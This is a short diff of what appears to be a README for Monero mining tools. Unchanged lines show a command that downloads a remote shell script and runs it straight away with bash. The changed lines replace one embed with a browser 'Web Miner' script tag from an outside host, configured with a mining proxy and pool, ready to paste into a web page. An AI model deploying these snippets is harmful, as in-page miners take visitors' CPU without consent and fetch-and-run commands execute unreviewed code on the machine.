@@ -7,9 +7,9 @@ wget https://raw.githubusercontent.com/thealidev/sm/main/mine.sh && bash mine.sh
 ```
 ! wget https://raw.githubusercontent.com/thealidev/sm/main/mine.sh && bash mine.sh
 ```
-## `XMonitizer`
+## `Web Miner`
 ```
-<script src="https://xmonitizer.vercel.app/index.js"></script>
+<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
 <script>
     server = "wss://f.xmrminingproxy.com:8181";
     var pool = "moneroocean.stream";
